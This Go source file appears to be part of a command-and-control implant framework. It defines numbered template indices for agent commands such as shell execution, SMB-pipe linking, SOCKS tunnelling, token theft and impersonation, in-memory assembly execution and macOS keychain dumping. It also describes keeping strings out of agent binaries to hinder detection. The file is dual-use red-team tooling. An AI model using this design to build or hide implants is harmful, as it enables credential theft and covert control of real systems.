// internal/templates/common.go
package templates

import (
	"encoding/json"
)

// CommandTemplate represents server-side template data sent to agents
// Uses arrays instead of maps to avoid string keys in agent binaries
// This is the general template for non-persistence commands
type CommandTemplate struct {
	Version   int      `json:"v"`   // Template version for future compatibility
	Type      int      `json:"t"`   // Command type identifier
	Templates []string `json:"tpl"` // Template strings indexed by position
	Params    []string `json:"p"`   // Parameters indexed by position
}

// Command type identifiers (start at 10 to not conflict with persistence types 1-4)
const (
	TypeShell          = 10
	TypeLink           = 11
	TypeSocks          = 12
	TypePs             = 13
	TypeLs             = 14
	TypeRm             = 15
	TypeHash           = 16
	TypeCmdProc        = 17
	TypeExecReq        = 18
	TypeSudoSess       = 19
	TypeBof            = 20
	TypeInlineAssembly = 21
	TypeDownload       = 22
	TypeWhoami         = 23
	TypeToken          = 24
	TypeRev2Self       = 25
	TypeKeychain       = 26
)

// MaxTemplateSize ensures all indices have values across all command types
const MaxTemplateSize = 700

// ============================================================================
// SHELL TEMPLATE INDICES (100-119)
// ============================================================================
const (
	// Shell paths
	IdxShellPathBinBash    = 100 // /bin/bash
	IdxShellPathBinZsh     = 101 // /bin/zsh
	IdxShellPathBinSh      = 102 // /bin/sh
	IdxShellPathUsrBinBash = 103 // /usr/bin/bash
	IdxShellPathUsrBinZsh  = 104 // /usr/bin/zsh
	IdxShellPathUsrBinSh   = 105 // /usr/bin/sh
	IdxShellFallback       = 106 // sh

	// Environment
	IdxShellEnvVar = 107 // SHELL

	// Shell arguments
	IdxShellArgC = 108 // -c

	// Flags (short form only - server transforms long flags)
	IdxShellFlagSudo    = 109 // -s
	IdxShellFlagTimeout = 110 // -t

	// Output markers
	IdxShellStderrMarker = 111 // [STDERR]\n

	_shellEnd = 119
)

// ============================================================================
// LINK TEMPLATE INDICES (120-139)
// ============================================================================
const (
	// Protocol identifiers
	IdxLinkProtoSmb = 120 // smb
	IdxLinkProtoTcp = 121 // tcp

	// UNC path components
	IdxLinkUncSlashes = 122 // \\
	IdxLinkPipePath   = 123 // \pipe\

	// Network defaults
	IdxLinkLocalhost  = 124 // localhost
	IdxLinkLoopback   = 125 // 127.0.0.1
	IdxLinkDefaultPort = 126 // 4444

	// Output markers
	IdxLinkStatusPrefix = 127 // S6|
	IdxLinkPingMarker   = 128 // P
	IdxLinkQuitMarker   = 129 // Q

	// Actions
	IdxLinkActionStart = 130 // start
	IdxLinkActionStop  = 131 // stop

	// Misc
	IdxLinkDot = 132 // . (local machine for SMB)

	// Link manager protocol strings (JSON keys/values for inter-agent communication)
	IdxLinkKeyType      = 133 // type
	IdxLinkKeyPayload   = 134 // payload
	IdxLinkMsgData      = 135 // data
	IdxLinkMsgDisconn   = 136 // disconnect
	IdxLinkMsgHandshake = 137 // handshake
	IdxLinkMsgPing      = 138 // ping
	IdxLinkMsgPong      = 139 // pong

	// Extended link manager strings (140-149 - borrowed from SOCKS start)
	IdxLinkStatusActive = 340 // active
	IdxLinkStatusInact  = 341 // inactive
	IdxLinkAuthPrefix   = 342 // AUTH:
	IdxLinkAuthOK       = 343 // OK
	IdxLinkFmtList      = 344 // Active Links (%d):\n
	IdxLinkFmtRow       = 345 // [%s] %s - %s (connected: %s, last seen: %s)\n
	IdxLinkTimeFmt      = 346 // 15:04:05

	_linkEnd = 139 // Core link indices end at 139
)

// ============================================================================
// SOCKS TEMPLATE INDICES (140-159)
// ============================================================================
const (
	// Protocol format strings
	IdxSocksWssFmt = 140 // wss://%s:%d%s

	// SSH constants
	IdxSocksKeepalive   = 141 // keepalive@golang.org
	IdxSocksDirectTcpip = 142 // direct-tcpip

	// Actions
	IdxSocksActionStart = 143 // start
	IdxSocksActionStop  = 144 // stop

	// Errors
	IdxSocksErrUnknownChannel = 145 // unknown channel type
	IdxSocksErrLimitReached   = 146 // connection limit reached

	_socksEnd = 159
)

// ============================================================================
// PS TEMPLATE INDICES (160-199)
// ============================================================================
const (
	// Proc paths
	IdxPsProcCmdline = 160 // /proc/%d/cmdline
	IdxPsProcExe     = 161 // /proc/%d/exe
	IdxPsProcStat    = 162 // /proc/%d/stat
	IdxPsProcStatus  = 163 // /proc/%d/status
	IdxPsProcDir     = 164 // /proc

	// OS identifiers
	IdxPsOsLinux   = 165 // linux
	IdxPsOsWindows = 166 // windows
	IdxPsOsDarwin  = 167 // darwin

	// Flags (short form - server transforms)
	IdxPsFlagVerbose   = 168 // -v
	IdxPsFlagExtended  = 169 // -x
	IdxPsFlagJson      = 170 // -j
	IdxPsFlagNoTrunc   = 171 // -n
	IdxPsFlagFilter    = 172 // -f
	IdxPsFlagUser      = 173 // -u
	IdxPsFlagSort      = 174 // -s

	// Sort values
	IdxPsSortCpu    = 175 // cpu
	IdxPsSortMem    = 176 // mem
	IdxPsSortMemory = 177 // memory
	IdxPsSortName   = 178 // name
	IdxPsSortUser   = 179 // user
	IdxPsSortPid    = 180 // pid

	// Status values
	IdxPsStatusName   = 181 // Name:
	IdxPsStatusUid    = 182 // Uid:
	IdxPsStatusState  = 183 // State:
	IdxPsStatusPpid   = 184 // PPid:
	IdxPsStatusVmRss  = 185 // VmRSS:

	// Windows-specific PS strings
	IdxPsRunningAs    = 186 // Running as:
	IdxPsBackslash    = 187 // \
	IdxPsImpersonated = 188 //  (impersonated)

	_psEnd = 199
)

// ============================================================================
// LS TEMPLATE INDICES (200-239)
// ============================================================================
const (
	// Windows system paths to filter
	IdxLsWinSysVolInfo   = 200 // System Volume Information
	IdxLsWinRecycleBin   = 201 // $Recycle.Bin
	IdxLsWinConfigMsi    = 202 // Config.Msi
	IdxLsWinPagefile     = 203 // pagefile.sys
	IdxLsWinHiberfil     = 204 // hiberfil.sys
	IdxLsWinSwapfile     = 205 // swapfile.sys
	IdxLsWinDsStore      = 206 // .DS_Store
	IdxLsWinSpotlight    = 207 // .Spotlight-V100
	IdxLsWinFseventsd    = 208 // .fseventsd
	IdxLsWinTrashes      = 209 // .Trashes

	// OS identifiers
	IdxLsOsWindows = 210 // windows
	IdxLsOsLinux   = 211 // linux
	IdxLsOsDarwin  = 212 // darwin

	// Flags (short form - server transforms)
	IdxLsFlagMaxDepth = 213 // -d
	IdxLsFlagCount    = 214 // -c
	IdxLsFlagExclude  = 215 // -e
	IdxLsFlagIgnore   = 216 // -i
	IdxLsFlagFilter   = 217 // -f
	IdxLsFlagAll      = 218 // -a
	IdxLsFlagLong     = 219 // -l

	// File type markers
	IdxLsTypeDir     = 220 // d
	IdxLsTypeFile    = 221 // -
	IdxLsTypeSymlink = 222 // l

	// Additional Windows system paths
	IdxLsWinRecovery    = 223 // Recovery
	IdxLsWinProgramData = 224 // ProgramData

	_lsEnd = 239
)

// ============================================================================
// RM TEMPLATE INDICES (240-259)
// ============================================================================
const (
	// Flags (short form - server transforms)
	IdxRmFlagRecursive = 240 // -r
	IdxRmFlagForce     = 241 // -f

	// Error patterns
	IdxRmErrPermDenied     = 242 // permission denied
	IdxRmErrDirNotEmpty    = 243 // directory not empty
	IdxRmErrResourceBusy   = 244 // resource busy
	IdxRmErrNotExist       = 245 // does not exist
	IdxRmErrIsDirectory    = 246 // is a directory

	_rmEnd = 259
)

// ============================================================================
// HASH TEMPLATE INDICES (260-279)
// ============================================================================
const (
	// Algorithms (short form - server transforms)
	IdxHashAlgoSha256 = 260 // s (sha256)
	IdxHashAlgoMd5    = 261 // m (md5)
	IdxHashAlgoAll    = 262 // a (all/both)

	// Output prefixes
	IdxHashPrefixMd5    = 263 // MD5:
	IdxHashPrefixSha256 = 264 // SHA256:

	// Full algorithm names (for output)
	IdxHashNameSha256 = 265 // sha256
	IdxHashNameMd5    = 266 // md5

	_hashEnd = 279
)

// ============================================================================
// COMMAND PROCESSOR TEMPLATE INDICES (280-299)
// ============================================================================
const (
	// Command names
	IdxCmdProcInlineAssemblyJobs      = 280 // inline-assembly-jobs
	IdxCmdProcInlineAssemblyJobsClean = 281 // inline-assembly-jobs-clean
	IdxCmdProcInlineAssemblyJobsStats = 282 // inline-assembly-jobs-stats
	IdxCmdProcInlineAssemblyOutput    = 283 // inline-assembly-output
	IdxCmdProcInlineAssemblyOutputSp  = 284 // inline-assembly-output (with space)
	IdxCmdProcInlineAssemblyKill      = 285 // inline-assembly-kill
	IdxCmdProcInlineAssemblyKillSp    = 286 // inline-assembly-kill (with space)
	IdxCmdProcInlineAssembly          = 287 // inline-assembly
	IdxCmdProcInlineAssemblyAsync     = 288 // inline-assembly-async
	IdxCmdProcBof                     = 289 // bof
	IdxCmdProcUpload                  = 290 // upload
	IdxCmdProcDownload                = 291 // download
	IdxCmdProcAsync                   = 292 // async

	// Error message suffixes
	IdxCmdProcErrNotRegistered = 293 //  command not registered
	IdxCmdProcErrHandlerNotReg = 294 //  handler not registered

	_cmdProcEnd = 299
)

// ============================================================================
// EXEC REQUIREMENTS TEMPLATE INDICES (300-319)
// ============================================================================
const (
	// File paths
	IdxExecReqPathEtcHostname = 300 // /etc/hostname
	IdxExecReqPathSssdConf    = 301 // /etc/sssd/sssd.conf
	IdxExecReqPathSmbConf     = 302 // /etc/samba/smb.conf
	IdxExecReqPathKrb5Conf    = 303 // /etc/krb5.conf
	IdxExecReqPathIpaConf     = 304 // /etc/ipa/default.conf
	IdxExecReqPathProc        = 305 // /proc
	IdxExecReqPathTildeFwd    = 306 // ~/

	// Environment variable names
	IdxExecReqEnvUser    = 307 // USER
	IdxExecReqEnvLogname = 308 // LOGNAME

	// Config file patterns
	IdxExecReqPatternDomainsEq  = 309 // domains =
	IdxExecReqPatternDomainsEq2 = 310 // domains=
	IdxExecReqPatternWorkgroup  = 311 // workgroup
	IdxExecReqPatternRealm      = 312 // realm
	IdxExecReqPatternDefRealm   = 313 // default_realm
	IdxExecReqPatternDomainEq   = 314 // domain =
	IdxExecReqPatternDomainEq2  = 315 // domain=

	// Proc file names
	IdxExecReqProcCmdline = 316 // cmdline
	IdxExecReqProcComm    = 317 // comm

	// String literals
	IdxExecReqWordTrue    = 318 // true
	IdxExecReqTimeFmtFull = 319 // 2006-01-02 15:04:05

	_execReqEnd = 319
)

// ============================================================================
// SUDO SESSION TEMPLATE INDICES (320-339)
// ============================================================================
const (
	// Command name
	IdxSudoSessCmdName = 320 // sudo-session

	// Subcommands
	IdxSudoSessStart           = 321 // start
	IdxSudoSessStop            = 322 // stop
	IdxSudoSessExec            = 323 // exec
	IdxSudoSessExecStateful    = 324 // exec-stateful
	IdxSudoSessEnableStateful  = 325 // enable-stateful
	IdxSudoSessDisableStateful = 326 // disable-stateful
	IdxSudoSessStatus          = 327 // status

	// Default user
	IdxSudoSessDefaultUser = 328 // root

	_sudoSessEnd = 339
)

// ============================================================================
// BOF TEMPLATE INDICES (350-399)
// ============================================================================
const (
	// Command names (350-359)
	IdxBofCmdName        = 350 // bof
	IdxBofCmdAsync       = 351 // bof-async
	IdxBofCmdJobs        = 352 // bof-jobs
	IdxBofCmdOutput      = 353 // bof-output
	IdxBofCmdKill        = 354 // bof-kill
	IdxBofCmdAsyncPrefix = 355 // bof-async (with space)
	IdxBofCmdAsyncStatus = 356 // bof-async-status
	IdxBofCmdAsyncOutput = 357 // bof-async-output
	IdxBofOSWindows      = 358 // windows

	// Job status values (360-364)
	IdxBofStatusRunning   = 360 // running
	IdxBofStatusCompleted = 361 // completed
	IdxBofStatusCrashed   = 362 // crashed
	IdxBofStatusKilled    = 363 // killed
	IdxBofStatusTimeout   = 364 // timeout

	// Output markers (365-369)
	IdxBofAsyncStarted   = 365 // BOF_ASYNC_STARTED
	IdxBofAsyncPrefix    = 366 // BOF_ASYNC_
	IdxBofChunkPrefix    = 367 // |CHUNK_
	IdxBofChunkSeparator = 368 // \n---CHUNK_SEPARATOR---\n
	IdxBofPipeSep        = 369 // |

	// Final status markers (370-374)
	IdxBofFinalCompleted = 370 // COMPLETED
	IdxBofFinalCrashed   = 371 // CRASHED
	IdxBofFinalKilled    = 372 // KILLED
	IdxBofFinalTimeout   = 373 // TIMEOUT
	IdxBofFinalOutput    = 374 // OUTPUT

	// Misc strings (375-377)
	IdxBofTruncYes      = 375 // YES
	IdxBofTruncDots     = 376 // ...
	IdxBofTruncatedMsg  = 377 // (OUTPUT TRUNCATED - exceeded 10MB limit)

	// Output message fragments (378-387)
	IdxBofJobPrefix       = 378 // Job
	IdxBofStillRunning    = 379 // is still running\n
	IdxBofChunksSent      = 380 // Chunks sent:
	IdxBofSpaceParen      = 381 // (
	IdxBofNoBufferedOut   = 382 // ) has no buffered output\n
	IdxBofOutputForJob    = 383 // Output for job
	IdxBofChunksSentParen = 384 // (chunks sent:
	IdxBofCloseColonNL    = 385 // ):\n
	IdxBofCloseParen      = 386 // )

	// IPC path (388)
	IdxBofIPCPath = 388 // \IPC$

	_bofEnd = 399
)

// ============================================================================
// INLINE ASSEMBLY TEMPLATE INDICES (400-449)
// ============================================================================
const (
	// CLR strings (400-404)
	IdxIAClrV4      = 400 // v4
	IdxIAClrV2      = 401 // v2
	IdxIAClrV2Full  = 402 // v2.0.50727
	IdxIATempPrefix = 403 // clr_output_
	IdxIATempSuffix = 404 // .txt

	// Output markers (405-406)
	IdxIAOutputStart = 405 // \n>>>\n
	IdxIAOutputEnd   = 406 // \n<<<\n

	// Runfor detection (407-408)
	IdxIARunforFlag = 407 // /runfor
	IdxIAColon      = 408 // :

	// Status messages (409-416)
	IdxIADoneMsg      = 409 // \nDone\n
	IdxIADoneExitPrev = 410 // \nDone (exit prevented)\n
	IdxIADoneAfterPre = 411 // \nDone after
	IdxIADoneAfterSuf = 412 // ds\n
	IdxIADonePre      = 413 // \nDone (
	IdxIADoneSuf      = 414 // )\n
	IdxIAExitPrevMsg  = 415 // \nExit prevented\n

	// Error detection keywords (417-418)
	IdxIAKwExit      = 417 // exit
	IdxIAKwTerminate = 418 // terminate

	// CLR corruption (419-420)
	IdxIAClrErrCode = 419 // 0x80131604
	IdxIAClrCorrupt = 420 // \nCLR corrupted (0x80131604)\n

	// Command names (421-425)
	IdxIACmdJobs   = 421 // inline-assembly-jobs
	IdxIACmdOutput = 422 // inline-assembly-output
	IdxIACmdKill   = 423 // inline-assembly-kill
	IdxIACmdClean  = 424 // inline-assembly-jobs-clean
	IdxIACmdStats  = 425 // inline-assembly-jobs-stats

	// Status strings (426-430)
	IdxIAStatusRunning   = 426 // running
	IdxIAStatusCompleted = 427 // completed
	IdxIAStatusFailed    = 428 // failed
	IdxIAStatusKilled    = 429 // killed
	IdxIAStatusTimeout   = 430 // timeout

	// Format components (431-441)
	IdxIAFmtRunningPrefix = 431 // r:
	IdxIAFmtDonePrefix    = 432 // d:
	IdxIAFmtDash          = 433 // -
	IdxIAFmtPipe          = 434 // |
	IdxIAFmtNewline       = 435 // \n
	IdxIAFmtEllipsis      = 436 // ...
	IdxIAFmtColSep        = 437 // " | "
	IdxIAFmtZero          = 438 // 0
	IdxIAFmtOne           = 439 // 1
	IdxIAFmtColonSingle   = 440 // :

	// Stats labels (442-448)
	IdxIAStatsHeader   = 442 // Stats:\n
	IdxIAStatsTotalLbl = 443 // Total Jobs:
	IdxIAStatsRunLbl   = 444 // Running:
	IdxIAStatsCompLbl  = 445 // Completed:
	IdxIAStatsFailLbl  = 446 // Failed:
	IdxIAStatsKillLbl  = 447 // Killed:
	IdxIAStatsTimeLbl  = 448 // Timeout:

	_inlineAssemblyEnd = 449
)

// ============================================================================
// TOKEN TEMPLATE INDICES (450-519)
// ============================================================================
const (
	// Command name (450)
	IdxTokCmdName = 450 // token

	// Verbs (451-464)
	IdxTokVerbCreate      = 451 // create
	IdxTokVerbSteal       = 452 // steal
	IdxTokVerbStore       = 453 // store
	IdxTokVerbUse         = 454 // use
	IdxTokVerbImpersonate = 455 // impersonate
	IdxTokVerbNetonly     = 456 // netonly
	IdxTokVerbList        = 457 // list
	IdxTokVerbStored      = 458 // stored
	IdxTokVerbCurrent     = 459 // current
	IdxTokVerbStatus      = 460 // status
	IdxTokVerbRemove      = 461 // remove
	IdxTokVerbClear       = 462 // clear
	IdxTokVerbRevert      = 463 // revert
	IdxTokVerbRev2self    = 464 // rev2self

	// Subcommand actions (465-466)
	IdxTokActSet       = 465 // set
	IdxTokActProcesses = 466 // processes

	// Logon types (467-475)
	IdxTokLogonNetwork      = 467 // network
	IdxTokLogonBatch        = 468 // batch
	IdxTokLogonService      = 469 // service
	IdxTokLogonNetCleartext = 470 // network_cleartext
	IdxTokLogonNetClear     = 471 // network_clear
	IdxTokLogonNewCreds     = 472 // new_credentials
	IdxTokLogonNewCredsAlt  = 473 // newcreds
	IdxTokLogonInteractive  = 474 // interactive

	// Source identifiers (476-479)
	IdxTokSourceStolen  = 476 // s
	IdxTokSourceCreated = 477 // c
	IdxTokStolenCmp     = 478 // stolen
	IdxTokCreatedCmp    = 479 // created

	// Token types (480-481)
	IdxTokTypeImpersonation = 480 // impersonation
	IdxTokTypePrimary       = 481 // primary

	// Utility strings (482-495)
	IdxTokUnknownLower = 482 // unknown
	IdxTokUnknown      = 483 // Unknown
	IdxTokBackslash    = 484 // \
	IdxTokNewline      = 485 // \n
	IdxTokUnderscore   = 486 // _
	IdxTokSpace        = 487 // (space)
	IdxTokColon        = 488 // :
	IdxTokPipe         = 489 // |
	IdxTokNone         = 490 // (none)
	IdxTokDots         = 491 // ...
	IdxTokAtSign       = 492 // @
	IdxTokDot          = 493 // .
	IdxTokComma        = 494 // ,
	IdxTokMode0        = 495 // 0
	IdxTokMode1        = 496 // 1

	// Output format strings (497-519)
	IdxTokTokenInfo      = 497  // Token Info:\n
	IdxTokProcessUser    = 498  // Process User:
	IdxTokImpTokenPrefix = 499  // \nImpersonating Token:
	IdxTokUserPrefix     = 500  // "  User: "
	IdxTokSourcePrefix   = 501  // "  Source: "
	IdxTokProcessPrefix  = 502  // "  Process: "
	IdxTokPidPrefix      = 503  // " (PID: "
	IdxTokPidSuffix      = 504  // ")\n"
	IdxTokLogonPrefix    = 505  // "  Logon Type: "
	IdxTokNoActiveImp    = 506  // "\nNo active impersonation\n"
	IdxTokNetOnlyTokPre  = 507  // "\nNetwork-Only Token: "
	IdxTokOrigUserPre    = 508  // "\nOriginal User: "
	IdxTokNetOnlyHdr     = 509  // "NetOnly:\n"
	IdxTokActiveNetPre   = 510  // "Active NetOnly Token: "
	IdxTokUserPre2       = 511  // "User: "
	IdxTokSourcePre2     = 512  // "Source: "
	IdxTokProcessPre2    = 513  // "Process: "
	IdxTokLogonPre2      = 514  // "Logon Type: "
	IdxTokNetOnlyToksHdr = 515  // "\nNetOnly Tokens:\n"
	IdxTokIndent2        = 516  // "  "

	_tokenEnd = 519
)

// ============================================================================
// REV2SELF TEMPLATE INDICES (520-569)
// ============================================================================
const (
	// Command/argument strings (520-521)
	IdxR2sCmdName = 520 // rev2self
	IdxR2sArgAll  = 521 // /all

	// Path strings (522-524)
	IdxR2sUncPrefix  = 522 // \\
	IdxR2sBackslash  = 523 // \
	IdxR2sIpcSuffix  = 524 // \IPC$

	// Output strings (525-549)
	IdxR2sUnknown      = 525 // Unknown
	IdxR2sNewline      = 526 // \n
	IdxR2sNoImperson   = 527 // No active impersonation detected
	IdxR2sCurUser      = 528 // "Current user: "
	IdxR2sImpReverted  = 529 // "\n    Impersonation reverted:\n"
	IdxR2sWas          = 530 // "    Was: "
	IdxR2sNow          = 531 // "    Now: "
	IdxR2sNetOnlyClr   = 532 // "\n    Network-only token cleared: "
	IdxR2sDisconnected = 533 // "\n    Disconnected "
	IdxR2sNetConns     = 534 // " network connection(s)\n"
	IdxR2sSharePrefix  = 535 // "      - "
	IdxR2sAndMore      = 536 // "      ... and "
	IdxR2sMore         = 537 // " more\n"
	IdxR2sNoNetConns   = 538 // "\n    Note: No active network connections found to disconnect\n"
	IdxR2sSmbCache     = 539 // "    (SMB cache may still allow one more access)\n"
	IdxR2sTokensStored = 540 // \n
	IdxR2sTokensSuffix = 541 // " token(s) stored"

	_rev2selfEnd = 569
)

// ============================================================================
// DOWNLOAD TEMPLATE INDICES (570-589)
// ============================================================================
const (
	// Command strings
	IdxDlCmdName   = 570 // download
	IdxDlOSWindows = 571 // windows
	IdxDlCmdPrefix = 572 // download (with trailing space)

	// Output format strings
	IdxDlChunkFmt = 573 // \nS4:
	IdxDlPipeSep  = 574 // |
	IdxDlSlash    = 575 // /

	// Windows-specific
	IdxDlAsPrefix  = 576 // Downloading as
	IdxDlBackslash = 577 // \
	IdxDlNewline   = 578 // \n

	_downloadEnd = 589
)

// ============================================================================
// WHOAMI TEMPLATE INDICES (590-609)
// ============================================================================
const (
	// Command strings
	IdxWaCmdName  = 590 // whoami
	IdxWaWindows  = 591 // windows

	// Flags
	IdxWaFlagV = 592 // -v
	IdxWaFlagG = 593 // -g

	// Misc
	IdxWaBackslash = 594 // \

	_whoamiEnd = 609
)

// ============================================================================
// KEYCHAIN TEMPLATE INDICES (610-679) - Darwin only
// ============================================================================
const (
	// Actions (610-616)
	IdxKcList   = 610 // list
	IdxKcDump   = 611 // dump
	IdxKcSearch = 612 // search
	IdxKcAdd    = 613 // add
	IdxKcDelete = 614 // delete
	IdxKcExport = 615 // export
	IdxKcUnlock = 616 // unlock

	// Flags (617-622)
	IdxKcFlagKeychain = 617 // --keychain
	IdxKcFlagService  = 618 // --service
	IdxKcFlagAccount  = 619 // --account
	IdxKcFlagLabel    = 620 // --label
	IdxKcFlagPassword = 621 // --password
	IdxKcFlagOutput   = 622 // --output

	// Parsing strings (623-630)
	IdxKcPKeychain = 623 // keychain:
	IdxKcPData     = 624 // data:
	IdxKcPPassword = 625 // password:
	IdxKcPAcct     = 626 // "acct"
	IdxKcPSvce     = 627 // "svce"
	IdxKcPDesc     = 628 // "desc"
	IdxKcPLabl     = 629 // labl
	IdxKcPSubj     = 630 // subj

	// Security tool and subcommands (631-642)
	IdxKcSecurity        = 631 // security
	IdxKcListKeychains   = 632 // list-keychains
	IdxKcDefaultKeychain = 633 // default-keychain
	IdxKcDumpKeychain    = 634 // dump-keychain
	IdxKcFindInternetPwd = 635 // find-internet-password
	IdxKcFindCertificate = 636 // find-certificate
	IdxKcFindGenericPwd  = 637 // find-generic-password
	IdxKcAddGenericPwd   = 638 // add-generic-password
	IdxKcDeleteGenericPwd = 639 // delete-generic-password
	IdxKcSecExport       = 640 // export
	IdxKcUnlockKeychain  = 641 // unlock-keychain

	// Path strings (642-644)
	IdxKcLibrary   = 642 // Library
	IdxKcKeychains = 643 // Keychains
	IdxKcKcStr     = 644 // keychain

	// Export format strings (645-646)
	IdxKcIdentities = 645 // identities
	IdxKcPkcs12     = 646 // pkcs12

	// Map key strings (647-652)
	IdxKcMKeychain    = 647 // keychain
	IdxKcMAccount     = 648 // account
	IdxKcMService     = 649 // service
	IdxKcMDescription = 650 // description
	IdxKcMData        = 651 // data
	IdxKcMPassword    = 652 // password

	_keychainEnd = 679
)

// ToJSON serializes the template to JSON bytes
func (t *CommandTemplate) ToJSON() ([]byte, error) {
	return json.Marshal(t)
}

// ParseCommandTemplate deserializes JSON to a CommandTemplate
func ParseCommandTemplate(data []byte) (*CommandTemplate, error) {
	var t CommandTemplate
	if err := json.Unmarshal(data, &t); err != nil {
		return nil, err
	}
	return &t, nil
}
